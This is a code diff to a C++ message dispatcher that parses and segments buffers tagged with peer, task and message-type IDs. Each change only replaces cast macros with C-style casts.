@@ -63,9 +63,9 @@ namespace Dispatcher {
             Parser::CreateParser(&parser, B_PTR(msg->buffer), msg->length);
 
             queue            = Stream::CreateStream();
-            queue->peer_id   = __builtin_bswap32(S_CAST(ULONG, Parser::UnpackDword(&parser)));
-            queue->task_id   = __builtin_bswap32(S_CAST(ULONG, Parser::UnpackDword(&parser)));
-            queue->msg_type  = __builtin_bswap32(S_CAST(ULONG, Parser::UnpackDword(&parser)));
+            queue->peer_id   = __builtin_bswap32((ULONG) Parser::UnpackDword(&parser));
+            queue->task_id   = __builtin_bswap32((ULONG) Parser::UnpackDword(&parser));
+            queue->msg_type  = __builtin_bswap32((ULONG) Parser::UnpackDword(&parser));
 
             queue->length   = parser.Length;
             queue->buffer   = B_PTR(x_realloc(queue->buffer, queue->length));
@@ -92,7 +92,7 @@ namespace Dispatcher {
 
         while (length > 0) {
             cb_seg  = length > m_max ? m_max : length;
-            queue   = S_CAST(_stream*, x_malloc(cb_seg + SEGMENT_HEADER_SIZE));
+            queue   = (_stream*) x_malloc(cb_seg + SEGMENT_HEADER_SIZE);
 
             x_memcpy(&peer_id, buffer, 4);
             x_memcpy(&task_id, buffer + 4, 4);
@@ -135,7 +135,7 @@ namespace Dispatcher {
                     Stream::PackBytes(out, B_PTR(head->buffer), head->length);
                 }
                 else {
-                    Utils::AppendBuffer(&out->buffer, head->buffer, R_CAST(uint32_t*, &out->length), head->length);
+                    Utils::AppendBuffer(&out->buffer, head->buffer, (uint32_t*) &out->length, head->length);
                 }
                 break;
             }
